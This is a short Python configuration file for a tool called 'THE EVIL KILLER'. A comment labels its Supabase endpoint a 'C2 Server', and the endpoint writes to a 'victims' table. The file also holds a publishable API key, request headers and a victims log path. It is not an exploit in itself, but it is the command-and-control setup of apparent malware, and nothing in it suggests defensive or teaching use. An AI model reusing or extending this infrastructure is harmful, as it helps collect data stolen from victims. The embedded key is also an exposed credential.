import os

class Config:
    # Supabase Credentials (C2 Server)
    SB_URL = "https://rhirdkxpbmer vkvfcruq.supabase.co/rest/v1/victims"
    SB_KEY = "sb_publishable_8KKF6PJrw_n9b_UjTeovWg_u57T0-1_"
    
    # API Headers untuk koneksi ke Database
    HEADERS = {
        "apikey": SB_KEY,
        "Authorization": f"Bearer {SB_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    
    # System Metadata
    VERSION = "3.4.0-PRO"
    PROJECT_NAME = "THE EVIL KILLER"
    LOG_PATH = "logs/victims.log"
